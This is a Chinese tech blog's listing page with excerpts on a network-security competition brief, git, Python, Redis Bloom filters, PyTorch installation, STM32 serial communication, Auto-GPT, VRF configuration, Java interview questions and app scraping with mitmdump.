竞赛任务
竞赛时间
分值
第一阶段
网络平台搭建与设备安全防护
任务1
网络平台搭建
XX:XX- XX:XX
50
任务2
网络安全设备配置与防护
250
赛项内容 本次大赛，各位选手需要完成三个阶段的任务，其中第一个阶段需要按裁判组专门提供的U盘中的“XXX-答题模板”提交答案。第二、三阶段请根据现场具体题目要求操作。
选手首先需要在U盘的根目录下建立一个名为“GWxx”的文件夹（xx用具体的工位号替代），赛题第一阶段所完成的“XXX-答题模板”放置在文件夹中。
例如：08工位，则需要在U盘根目录下建立“GW08”文件夹，并在“GW08”文件夹下直接放置第一个阶段的所有“XXX-答题模板”文件。
特别说明：只允许在根目录下的“GWxx”文件夹中体现一次工位信息，不允许在其他文件夹名称或文件名称中再次体现工位信息，否则按作弊处理。
赛项环境设置 某集团公司原在北京建立了总部，在南京设立了分公司。总部设有销售、产品、财务、信息技术4个部门，分公司设有销售、产品、财务3个部门，统一进行IP及业务资源的规划和分配，全网采用OSPF动态路由协议和静态路由协议进行互连互通。公司规模在2023年快速发展，业务数据量和公司访问量增长巨大。为了更好管理数据，提供服务，集团决定建立自己的中型数据中心及业务服务平台，以达到快速、可靠交换数据，以及增强业务部署弹性的目的。集团、分公司的网络结构详见拓扑图。其中总公司使用一台SW交换机用于总部核心和终端高速接入，采用一台BC作为总公司因特网出口；分公司采用一台FW防火墙作为因特网出口设备，一台AC作为分公司核心，同时作为集团有线无线智能一体化控制器，通过与AP高性能企业级AP配合实现集团无线覆盖，总部有一台WEB服务器，为了安全考虑总公司部署了一台WAF对服务器进行web防护。在2023年公司进行IPV6网络改造，内部网络采用双栈模式。Ipv6 网络采用ospf V3实现互通。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b12473daa12e6453e5d857aeba3835cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a33ab9d722419060bf044886d67afbd8/" rel="bookmark">
			vscode中使用git提交代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 git提交代码
借助vs code
源码地址：https://gitee.com/618859/company-big-project-a
视频讲解
https://www.bilibili.com/video/BV1Xh4y1J7Ph?p=4&amp;vd_source=125d808bbbad2b8400f221b816a0f674
第一步: 相当于 git add .
第二步 ：相当于git commit -m”小明修改”
第三步 ：同步develop
3.1步
注意点：要两次同步
第一次同步: 同步develop完成–如果有冲突，解决冲突后，要重复前面第一，二，三步 。
第二次同步: 解决冲突后，要再次同步develop（因为不知道在你解决冲突的过程中，有没有同事在合并代码到develop）
如果看到如上图3.1这个样子，就表示没有冲突了。
第四步：推送完成
最后 流程原理图 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2b780cc914a8739367a05f7f1d382a4/" rel="bookmark">
			学习疯狂的python-property属性定义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		语法：
property(fget=None, fset = None, fdel=None, doc = None) 其中参数分别代表有getter方法、setter方法、del方法和doc，doc只是一个文档，用于说明属性。
开发者调用的时候，也可以传入0-4个不同参数。根据语法的要求，主要是前两个位置是最为普遍设置的参数。
class Rectangle: def __init__(self, width, height): self.width = width self.height = height #def setsize()函数 def setsize(self,size): self.width, self.height = size #定义getsize() 函数 def getsize(self): return self.width, self.height #定义delsize() def delsize(self): return self.widht, self.height #使用property属性 size = property(getsize, setsize, delsize) #访问size属性 print(Rectangle.size.__doc__) #内置help（）函数查看 help(Rectangle.size) rect = Rectangle(4,3) # 访问rect的size属性 print(rect.size) #删除size属性 del rect.size #访问width和height实例变量 print(rect.width) print(rect.height) property装饰器可以提供属性方便类进行表述，其中property属性增加之后，state成为可读属性，其中可以添加.setter方法。
class Cell: @property def state(self): return self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2b780cc914a8739367a05f7f1d382a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/480550539d0fed72867b7d0e06d3e201/" rel="bookmark">
			Redis 布隆过滤器总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis 布隆过滤器总结 适用场景 大数据判断是否存在来实现去重：这就可以实现出上述的去重功能，如果你的服务器内存足够大的话，那么使用 HashMap 可能是一个不错的解决方案，理论上时间复杂度可以达到 O(1) 的级别，但是当数据量起来之后，还是只能考虑布隆过滤器。
解决缓存穿透：我们经常会把一些热点数据放在 Redis 中当作缓存，例如产品详情。通常一个请求过来之后我们会先查询缓存，而不用直接读取数据库，这是提升性能最简单也是最普遍的做法，但是 如果一直请求一个不存在的缓存，那么此时一定不存在缓存，那就会有大量请求直接打到数据库上，造成 缓存穿透，布隆过滤器也可以用来解决此类问题。
在我们使用 Redis 时候，经常会面临这么一个问题，缓存穿透，意思是数据库和 redis 中都没有数据，缓存和db完全形同虚设。
面对这种问题，我们一般解决办法是设置null 的空值缓存，还有优雅点的实现方式就是布隆过滤器。
空值缓存
String key = stringRedisTemplate.opsForValue().get("key"); if (StringUtil.isEmpty(key)){ //查询db Object k = "test"; if (k!=null){ //存redis stringRedisTemplate.opsForValue().set("key",k.toString(),100); return k.toString(); }else { stringRedisTemplate.opsForValue().set("key","nullstr",10); return ""; } } if ("nullstr".equals(key)){ stringRedisTemplate.opsForValue().set("key","nullstr",10); return ""; } 布隆过滤器
对于恶意攻击，向服务器请求大量不存在的数据造成的缓存穿透，还可以用布隆过滤器先做一次过滤，对于不 存在的数据布隆过滤器一般都能够过滤掉，不让请求再往后端发送。当布隆过滤器说某个值存在时，这个值可 能不存在；当它说不存在时，那就肯定不存在。
使用布隆过滤器需要把所有数据提前放入布隆过滤器，并且在增加数据时也要往布隆过滤器里放，使用时候不能删除，如果有必须重新初始化。
实现原理 布隆过滤器就是一个大型的位数组和几个不一样的无偏 hash 函数。
所谓无偏就是能够把元素的 hash 值算得 比较均匀。
向布隆过滤器中添加 key 时，会使用多个 hash 函数对 key 进行 hash 算得一个整数索引值然后对位数组长度 进行取模运算得到一个位置，每个 hash 函数都会算得一个不同的位置。再把位数组的这几个位置都置为 1 就 完成了 add 操作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/480550539d0fed72867b7d0e06d3e201/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6101b5b306230a9c8341ca8452258539/" rel="bookmark">
			大型稀疏矩阵求解库SuiteSparse的Cholmod模块的配置使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步：安装好Ubuntu18.04环境，虚拟机和双系统都可以，本教程实在虚拟机完成
第二步：安装SuiteSparse，Cholmod顾名思义是SuiteSparse的Cholsky模块，经多次测试，下面的命令不成功
sudo apt-get install libcholmod3 应该是这样： sudo apt-get install libsuitesparse-dev ubuntu默认安装，头文件路径
/usr/include/suitesparse 库文件路径
/usr/lib/x86_64-linux-gnu 第三步：修改Vscode中的配置文件
（1）在Vscode中配置好C++环境，参考官方教程 Running Visual Studio Code on Linux
新建文件夹，打开文件夹以及cpp文件，cpp文件是测试代码，发现找不到头文件
（2）更改c_cpp_properties.json文件，在"includePath"里添加头文件路径
我又尝试了直接在工作目录新建一个文件夹将cholmod.h复制过来，还是找不到
第四步：Cmake编译运行
采用第二种方法，Cmake编译，强行链接到头文件和库文件，在工作目录新建文件，命名为CMakeLists.txt
cmake_minimum_required (VERSION 3.8) project(test VERSION 1.0.0) //项目名称 include_directories (/usr/include/suitesparse/) //头文件路径 link_directories(/usr/lib/x86_64-linux-gnu) //库文件路径 add_executable (main test.c) //项目名 cpp文件名 target_link_libraries (main cholmod) //项目名 需要连接的库文件名称 点击build，编译成功，点击run，发现运行成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e312bce26d8c9715e629cc3517c6332/" rel="bookmark">
			ChatGPT教程：Python代码优化之格式化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 在编写Python代码时，代码的格式化是一个非常重要的环节，良好的代码格式可以提高代码的可读性和可维护性。而ChatGPT是一种基于Transformer的自然语言处理模型，可以用于自然语言生成和理解，因此可以很好地帮助我们在格式化代码方面提高效率和质量。
总体介绍 在使用ChatGPT帮助我们格式化Python代码时，我们可以使用其文本生成的能力，通过输入一些自然语言描述，让ChatGPT根据其对Python语法的理解，生成出符合要求的Python代码。在下面的场景中，我们将展示如何使用ChatGPT完成代码的格式化。
场景1: 缩进代码块 Prompt： 我有一段Python代码，但是代码块中的缩进不正确，我该怎么办？
例子代码：
def foo(): print("Hello") if True: print("World") 解决方法：
我们可以向ChatGPT输入类似于下面的自然语言描述：
请帮我修复一下这段代码的缩进吧。我想要的效果是foo函数中print语句和if语句向右缩进4个空格。 ChatGPT的回答可能是这样的：
def foo(): print("Hello") if True: print("World") 场景2: 统一代码的缩进风格 Prompt： 我有一段Python代码，但是代码的缩进风格不一致，我该怎么办？
例子代码：
def foo(): print("Hello") if True: print("World") 解决方法：
我们可以向ChatGPT输入类似于下面的自然语言描述：
请帮我把这段代码的缩进风格变为4个空格。 ChatGPT的回答可能是这样的：
def foo(): print("Hello") if True: print("World") 场景3: 删除无用的空格和换行符 Prompt： 我有一段Python代码，但是代码中有很多多余的空格和换行符，我该怎么办？
例子代码：
def foo(): print("Hello") if True: print("World") 解决方法：
我们可以向ChatGPT输入类似于下面的自然语言描述：
请帮我删除这段代码中的多余空格和换行符，让代码更加整洁。 ChatGPT的回答可能是这样的：
def foo(): print("Hello") if True: print("World") 总结 在使用ChatGPT帮助我们格式化Python代码时，我们可以根据自己的需求，向ChatGPT输入相应的自然语言描述，让ChatGPT生成出符合要求的Python代码。这种方法可以帮助我们提高代码的可读性和可维护性，从而提高我们的编程效率和代码质量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/007957c2f3ead5142ed3be597d03971a/" rel="bookmark">
			ChatGPT教程：如何优化我们编写的Python代码？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景介绍 作为一名程序员，我们经常需要编写Python代码。然而，代码质量的好坏直接关系到程序的可读性、可维护性和可扩展性。因此，我们需要使用一些工具来帮助我们提高代码质量。ChatGPT是一种强大的自然语言处理模型，可以帮助我们完成这项任务。
场景介绍 场景一：格式化代码 Prompt：如何使用ChatGPT来格式化Python代码？
代码格式化可以使代码更加易读，减少错误，并且更易于维护。ChatGPT可以帮助我们完成这项任务。
代码示例：
# before formatting def my_func(): print("hello world") print("goodbye world") # after formatting def my_func(): print("hello world") print("goodbye world") 场景二：代码注释 Prompt：如何使用ChatGPT来添加代码注释？
代码注释可以使代码更加易读，并且更易于理解。ChatGPT可以帮助我们完成这项任务。
代码示例：
# before adding comment def my_func(): x = 1 + 2 return x # after adding comment def my_func(): # add 1 and 2 together x = 1 + 2 return x 场景三：代码重构 Prompt：如何使用ChatGPT来重构Python代码？
代码重构可以使代码更加简洁、易读，并且更易于维护。ChatGPT可以帮助我们完成这项任务。
代码示例：
# before refactoring def my_func(): x = 1 y = 2 z = x + y return z # after refactoring def my_func(): return 1 + 2 场景四：代码测试 Prompt：如何使用ChatGPT来测试Python代码？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/007957c2f3ead5142ed3be597d03971a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b85bd130166fa742b2007e0452faf036/" rel="bookmark">
			Ubantu系统查看防火墙状态。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu操作系统中有多种工具可以用来查看防火墙状态，其中最常用的是`ufw`（Uncomplicated Firewall）。
1. 首先，可以通过以下命令检查`ufw`是否已安装：
```
sudo ufw status
```
如果该命令返回“command not found”或其他错误信息，则表示`ufw`尚未安装。可以通过以下命令安装`ufw`：
```
sudo apt-get install ufw
```
2. 安装完成后，可以使用以下命令启用`ufw`：
```
sudo ufw enable
```
如果`ufw`已经处于活动状态，则该命令将显示“Firewall is already active”。
3. 可以使用以下命令检查`ufw`的状态：
```
sudo ufw status
```
该命令将返回`ufw`的状态信息，例如已启用的规则、已禁用的规则以及默认策略。
如果希望查看更详细的信息，可以使用以下命令：
```
sudo ufw status verbose
```
该命令将返回更详细的状态信息，例如已打开的端口和相关服务。
除了`ufw`之外，还有其他防火墙软件可供选择，例如`iptables`、`firewalld`等。每个防火墙软件都有自己的特点和用法，需要根据具体情况选择适合的软件。
有关更多详细信息，请访问蓝易云：www.tsyvps.com
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c3b84d940ba2aae65c290c4c830b600/" rel="bookmark">
			机器学习：模型评估与选择
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在机器学习任务中，我们需要选择一个或多个合适的模型对给定的数据集进行训练和测试。为了保证我们选择的模型能够对未知数据做出准确的推断，我们需要进行模型评估和选择。
模型评估指标： 模型评估指标是用来衡量我们所选择模型的优异程度，根据评价指标的不同，可能会导致选择出来的模型性能出现较大波动，因此需要针对不同的任务和数据集进行评估指标的选择和调整。
准确率
准确率是一个最常见的模型评估指标，它是指模型预测结果与实际结果相同的次数占总样本数的比例。
但是，当样本中类别分布不均匀时，准确率并不能反应模型真实的性能。例如对于某个数据集进行二元分类，其中正样本和负样本的比例相差较大，如果模型预测所有样本都为负样本，则准确率仍然高达 90% 以上，但是这样的结果对于我们来说毫无意义。
召回率和精确率
针对前述问题，我们可以引入召回率和精确率作为评估指标。
召回率是指被正确分类的正样本数占实际正样本总数的比例。增加召回率会导致模型误将负样本预测为正样本，因此要根据实际需求进行调整。
精确率是指被正确分类的正样本数占预测正样本总数的比例。增加精确率会导致模型漏判正样本，因此需要根据实际需求进行权衡。
F1_score
为了将召回率和精确率结合起来用作模型评价指标，我们可以使用 F1_score。F1_score 综合考虑了召回率和精确率的影响，并且常用于二分类问题中。
AUC值
AUC（Area Under Curve）是 ROC 曲线下的面积，ROC 指受试者工作特征曲线，广泛应用于分类器性能的评估。ROC 曲线的横坐标是假阳性率（ False Positive Rate， FPR ），纵坐标是真阳性率（ True Positive Rate， TPR ），而 AUC 值则是曲线下的面积，面积越大，说明模型性能越好。
模型选择： 在机器学习任务中，选择一个合适的模型是关键步骤。为了选择合适的模型，我们需要考虑模型的复杂度、训练时间、泛化能力等因素。
模型复杂度
模型复杂度是指模型的参数个数和结构复杂度，简单的模型容易过拟合，而过于复杂的模型可能会造成欠拟合，因此我们需要权衡模型的复杂度来获得最佳的性能。
泛化能力
泛化能力是指模型对于新的数据集的适应能力。一个模型在训练集上表现很好，但在测试集上表现很差的可能原因是模型过拟合了，从而在测试集上泛化性能减弱。因此，在选择模型时，需要考虑模型的泛化能力。
训练时间
训练时间过长可能会成为模型选择的一个重要考虑因素，需要对不同的模型进行评估和比较。
集成学习
另外，我们还可以采用集成学习的方法来提高模型的性能。集成学习是通过多个模型的组合来提高模型的精度和稳定性，包括模型平均、模型堆叠和模型融合等方法。
小结 机器学习模型评估与选择是保证机器学习算法高效、准确、可靠的关键因素之一。在选择模型时，我们需要全方位考虑不同模型的优缺点，并根据实际需求进行评估指标的选择和调整，从而获得更高效、准确的机器学习模型。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c92b3cb8e40e7047f4af2317c0dcef68/" rel="bookmark">
			conda虚拟环境中成功安装pytorch，但pycharm中import torch报错找不到指定的模块，Error loading caffe2_nvrtc.dll
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 我是先在conda中创建了虚拟环境，然后在PyTorch官网中选择好要安装的版本后，复制官网给出的安装命令
conda install pytorch==1.13.1 torchvision==0.14.1 torchaudio==0.13.1 pytorch-cuda=11.6 -c pytorch -c nvidia 在conda中安装了pytorch，一切顺利。然后 在conda中依次输入python→import torch→torch.cuda.is_available()，输出为True，表示pytorch安装成功。
但当我在pycharm中import torch的时候报错，
在网上查到了一种解决方法，就是不要使用快捷方式打开pycharm，而是在conda中 先切换到pycharm安装的bin目录，
这是我的目录，然后输入start pycharm64，启动pycharm。在采用这种方式打开的pycharm中import torch是没有问题的，但我觉得这种方法总不是长久之计。
结果最后就发现了另一种方法，就是在conda中安装pytorch的时候不要用官网给的conda的命令，而是用底下的用pip安装的命令，
pip install torch==1.13.1+cu116 torchvision==0.14.1+cu116 torchaudio==0.13.1 --extra-index-url https://download.pytorch.org/whl/cu116 这样安装成功之后，在pycharm中import torch就没有问题了。
实际上，采用conda命令安装后，用conda list输出包的时候是没有torch这个包的，有的是pytorch这个包，所以当我们在pycharm中选择这个虚拟环境作为解释器的时候，解释器里也是不包含torch包的，所以import torch自然报错。
但是当用pip命令安装成功后，用conda list查看包的时候是有torch这个包的，所以pycharm的解释器中也就有torch包，所以import torch的时候就没有问题。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb4900a766ff866c3bef73bf81661f76/" rel="bookmark">
			寻找两个正序数组的中位数（python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。
算法的时间复杂度应该为 O(log (m+n)) 。
题目分析： 这道题目需要我们在两个有序数组中，查找它们的中位数。中位数是指将一个集合元素按大小排列后，形成的一个数值序列中最中间的那个数。对于偶数个元素的序列，它没有唯一的中间值，而是取最中间的两个元素的算术平均数。
解决方案： 1.将两个有序数组进行切分，使得两个部分的长度差不超过 1。
2.使得切分后两个部分左侧的所有元素都小于右侧的所有元素。
3.根据两个部分左侧的元素个数之和判断中位数应该在哪一部分。
4.如果两个部分长度之和为奇数，则中位数为左侧部分最大的元素；如果长度为偶数，则需要取左侧最大元素和右侧最小元素的平均值作为中位数。
class Solution: def findMedianSortedArrays(self, nums1: List[int], nums2: List[int]) -&gt; float: # 将较长的数组定义为 nums1 if len(nums1) &gt; len(nums2): nums1, nums2 = nums2, nums1 m, n = len(nums1), len(nums2) left, right, half_len = 0, m, (m + n + 1) // 2 while left &lt;= right: i = (left + right) // 2 j = half_len - i if i &lt; m and nums2[j-1] &gt; nums1[i]: # i 偏小，需要右移 left = i + 1 elif i &gt; 0 and nums1[i-1] &gt; nums2[j]: # i 偏大，需要左移 right = i - 1 else: # i 长度刚好 if i == 0: max_of_left = nums2[j-1] elif j == 0: max_of_left = nums1[i-1] else: max_of_left = max(nums1[i-1], nums2[j-1]) if (m + n) % 2 == 1: return max_of_left if i == m: min_of_right = nums2[j] elif j == n: min_of_right = nums1[i] else: min_of_right = min(nums1[i], nums2[j]) return (max_of_left + min_of_right) / 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb4900a766ff866c3bef73bf81661f76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/997f2e8ac2ee614510bb4e0482158a97/" rel="bookmark">
			嵌入式学习笔记——STM32的USART收发字符串及串口中断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		USART收发字符串及串口中断 前言字符串的收发发送一个字符串接收字符串需求 利用串口实现printf 中断中断是什么串口的接收中断以及空闲中断实现代码实现效果 总结M4系列目录 前言 上一篇中，介绍了串口收发相关的寄存器，通过代码实现了一个字节的收发，本文接着上面的内容，通过功能函数实现字符串的收发，然后引入中断解决收发过程中while()死等的问题。
字符串的收发 发送一个字符串 根据昨天的字符发送函数，只需要稍作修改即可实现发送函数了，一个字符串的结尾会有一个’\0’作为结束符，所以再发送过程中，只需要判断当前发送的字符是不是结束符即可，如果不是结束符就将该位发送至电脑的串口调试助手，如果是结束符，那就意味着一个字符串发送完毕了。具体代码如下：
/******************************************* *函数名 :Usart1_Send_Str *函数功能 :串口1发送一个字符串函数 *函数参数 :u8 *str *函数返回值:无 *函数描述 : *********************************************/ void Usart1_Send_Str(u8 *str) { while(*str != '\0') { Usart1_Send_Byte(*str); str++; } } 接收字符串 发送字符串相对容易，接收这边，就需要借用C语言中的数组来帮忙了，因为数据是一个字符一个字符的发送过来的，每一次只能接收一个字符，所以需要使用一个数组来存接收到的位，而且串口助手在发送字符串的时候是不会给单片机发送结束符，所以还需要编程者自己规定结束符，当然，后面引入空闲中断之后就不需要这样操作了。这里笔者使用的是‘#’作为结束标志。具体实现代码如下：
/******************************************* *函数名 :Usart1_Receive_Str *函数功能 :串口1接收一个字节函数 *函数参数 :void *函数返回值:u8 str *函数描述 : *********************************************/ void Usart1_Receive_Str(void) { static u8 i=0; //等待接收完成 while(!(USART1-&gt;SR &amp; (1&lt;&lt;5))); //将数据寄存器的数据读取到数组 Str_Buff[i] = USART1-&gt;DR; i++; if(Str_Buff[i-1]=='#')//如果检测到结束标志‘#’ { Str_Buff[i-1]= '\0';//手动给字符串添加‘\0’结束符 i=0; Usart1_Receive_Str_Flag=1;//接收完成的标志位置一 Usart1_Send_Str(Str_Buff);//将接受的数组再发回串口助手 } } 需求 使用串口调试助手发送11打开1号小灯，10关闭一号小灯，21打开二号小灯，20关闭二号小灯。效果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/997f2e8ac2ee614510bb4e0482158a97/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06f1bc07584a03bb258027cc1b4b3f14/" rel="bookmark">
			直线飙升到10万&#43;star的AutoGpt，有多强？帮我写了个网页！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先来感受一下10万+的star，到底有多强！
从4月2日开始，直线飙升到10万+star
Auto-GPT是一个实验性的开源应用程序，展示了GPT-4语言模型的功能。这个程序由GPT-4驱动，将LLM“思想”链接在一起，以自主实现您设定的任何目标。作为GPT-4完全自主运行的第一个例子之一，Auto-GPT突破了AI的极限。
GPT-4或GPT-3.5本身无法浏览网页、执行代码，AutoGPT把这些操作变成命令，让GPT-4选择执行操作（包括谷歌搜索、浏览网站、读写文件、执行代码等）;
区别在于可以更加自主的通过搜索或其他方式自动化学习从而完成任务
gitpod.io搭建 Auto-GPT环境 网上有许多本地搭建auto-gpt的教程，小编这里不推荐的，因为繁琐而已影响本地环境，所以今天小编教你使用免费的的线上环境快速搭建一个环境
步骤：
1 Fork(https://github.com/Significant-Gravitas/Auto-GPT)，复制仓库到自己的 GitHub
2 进自己仓库，把浏览器地址中的 github.com 改为 gitpod.io/#（ https://gitpod.io/#/huawang400/Auto-GPT）
注意：取消勾选 Copy the master branch only,因为master可能不稳定哦！
3 进入gitpod:
4 选择项目， VS Code 在线编辑器，一键部署：
5 切换分支到stable：
6 找到.env.template，右键修改文件名为 .env ，修改 OPEN_API_KEY
7 执行 sh run.sh 命令，等着执行完毕，如下
8 ctrl+c退出，执行 python -m autogpt（python -m autogpt --help查看帮助）
AI执行任务 1 依次输入名称，角色，任务
名称：huawang
角色：a frontend developer
任务：goal1: Write a website praising a dog playing football；goal2: generate a htmlfile to build this website
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06f1bc07584a03bb258027cc1b4b3f14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bdb7aca243be3bb6ba03cb580ca2715/" rel="bookmark">
			A006 - 基础 - VRF/VPN-instance
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 VRF - Virtual Routing and Forwarding 主要是在一台三层设备上创建多张相互隔离的路由表:
VRF 又称 VPN instance，每个 instance 拥有独立的接口、路由表和协议进程；但是 VRF 不仅仅是用于 MPLS-VPN 这种 VPN 场景中，也可以在防火墙和 mgmt 等有隔离需求的场景中使用。 配置步骤:
# 创建 VPN-instance ip vpn-instance xxx ipv4-family # 使能 ipv4 地址簇 # tips: vpn-instance 中有些额外的属性，用于实现路由的引入和引出，比如 MPLS-VPN 中常用到的 rd 和 rt # 将某个接口加入 vpn-instance # 一个接口仅可属于一个 vpn-intance， 如果有多归属的需求，可以考虑子接口或vlanif 0/0/0] ip binding vpn-instance xxx # 在单独的路由表中添加静态路由 ip route-static vpn-instance xxx ..... # 为该 vpn-instance 起 ospf 进程 ospf id vpn-instance xxx # 查看命令 disp ip routing-table vpn-instance xxx # 查看 vpn-intance 单独的路由表 ping -vpn-instance xxx host # 使用该路由表，测试连通性 tracert -vpn-instance xxx host 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b38d3b24c2bf3a4905c48366b7595e55/" rel="bookmark">
			Java面试题复习(1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.mysql使用innodb引擎，请简述mysql索引的最左前缀，如何优化order by语句
2.在JVM内存模型中，为什么要区分新生去和老年代，对于新生代为什么要区分eden区和survial区？
3.常见的远程调用有几种
4.对于外部衔接的方法需要注意那些问题？
5.关于@Transactional注解范围理解
6.SpringBoot如何管理版本依赖?什么是自动配置，起步依赖？
7.数据库索引原理
8.Integer和int的区别
9.数据库的三大范式
10.什么是Spring的依赖注入？有那些方法进行依赖注入
11.理解JVM
12.浅谈ReentrantLock的设计
13.说一下mysql中事务的实现原理
14.编写一个基于线程安全的懒加载单例模式
15.值传递和引用传递问题
16.异常中的return问题
17.Spring的AOP的时评场景有那些
18.列举Linux的常用命令
19.列举知道并使用过其他前沿技术
20.JVM运行时数据区域包含那几个部分
21.多线程中的start()方法和run()方法的区别时什么
22.简单写一个会导致死锁的程序
23.对于高并发问题的处理方式
24.高可用问题的常用处理方式
26.数据连接池的工作机制是什么
27.那一个List实现最快插入
28.存在i+1的数么&lt;&gt;
33.null问题
34.共享变量多线程可见性问题
35.synchronize锁对象竞争问题
36.高级回答方式 多线程有几种实现方式
37.高级同步有几种实现方式
38.Thread类的常用方法
39.Exception父类问题
40.String值对比问题
43.gc守护线程和volatile问题
1.mysql使用innodb引擎，请简述mysql索引的最左前缀，如何优化order by语句 解:
理解：索引建立和查询是在内存当中，当索引不存在则会在磁盘进行io，如果更新一个字段，会在所有的有关索引进行更新，浪费时间
关键字：
1.如果排序字段不在索引列上会有firesort两种算法，单路排序和双路排序
(单路排序：快速排序，是一种分支思想的排序算法。双路排序：快排优化。单路排序会比双路排序快一点)
2.无过滤不索引（where。limit属于限制条件不是锅炉条件）
3.order by 最左firesort（最好完全匹配，比如3个字段，没有使用第一个字段，后面两个字段使用了，虽然也可以走索引，但是从explain中的extra中会查看也会使用Using firesort。可以去掉后面，不能去掉中间和前面的）
4.顺序错了（where,group by）
5.方向反了firesort（在order by中统一顺序排序,顺序变化会导致firesort）
6.熟练使用explain,必要使用使用optimizer_trance
答案：
1.首先要对sql进行分析检查，过滤字段、排序字段是否按照顺序创建索引
2.如果查询字段不在索引中会导致回表，降低性能
3.一定要有多虑字段
4.多个字段排序字段方向不一致也会导致firesort,降低性能
5.排序字段和索引顺序不一致也会导致firesort，降低性能
6.使用explain关键字段和索引情况
7.尽可能减少没必要的firesort
2.在JVM内存模型中，为什么要区分新生去和老年代，对于新生代为什么要区分eden区和survial区？ 关键点：
1.分清jvm标准与实现
2.分清收集算法在g1是逻辑上的划分之前的垃圾回收器可以理解是在物理上
3.标记算法
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b38d3b24c2bf3a4905c48366b7595e55/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3fdd2e662f38e1d55d5bf0cde403a12a/" rel="bookmark">
			Python爬虫学习 爬取京东商品
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 本节目标 以抓取京东 App 的商品信息和评论为例，实现 Appium 和 mitmdump 二者结合的抓取。抓取的数据分为两部分：一部分是商品信息，我们需要获取商品的 ID、名称和图片，将它们组成一条商品数据；另一部分是商品的评论信息，我们将评论人的昵称、评论正文、评论日期、发表图片都提取，然后加入商品 ID 字段，将它们组成一条评论数据。最后数据保存到 MongoDB 数据库。
2. 准备工作 请确保 PC 已经安装好 Charles、mitmdump、Appium、Android 开发环境，以及 Python 版本的 Appium API。Android 手机安装好京东 App。另外，安装好 MongoDB 并运行其服务，安装 PyMongo 库。具体的配置过程可以参考第 1 章。
3. Charles 抓包分析 首先，我们将手机代理设置到 Charles 上，用 Charles 抓包分析获取商品详情和商品评论的接口。
获取商品详情的接口，这里提取到的接口是来自 cdnware.m.jd.com 的链接，返回结果是一个 JSON 字符串，里面包含了商品的 ID 和商品名称，如图 11-47 和图 11-48 所示。
再获取商品评论的接口，这个过程在前文已提到，在此不再赘述。这个接口来自 api.m.jd.com，返回结果也是 JSON 字符串，里面包含了商品的数条评论信息。
之后我们可以用 mitmdump 对接一个 Python 脚本来实现数据的抓取。
4. mitmdump 抓取 新建一个脚本文件，然后实现这个脚本以提取这两个接口的数据。首先提取商品的信息，代码如下所示：
这里声明了接口的部分链接内容，然后与请求的 URL 作比较。如果该链接出现在当前的 URL 中，那就证明当前的响应就是商品详情的响应，然后提取对应的 JSON 信息即可。在这里我们将商品的 ID、名称和图片提取出来，这就是一条商品数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3fdd2e662f38e1d55d5bf0cde403a12a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
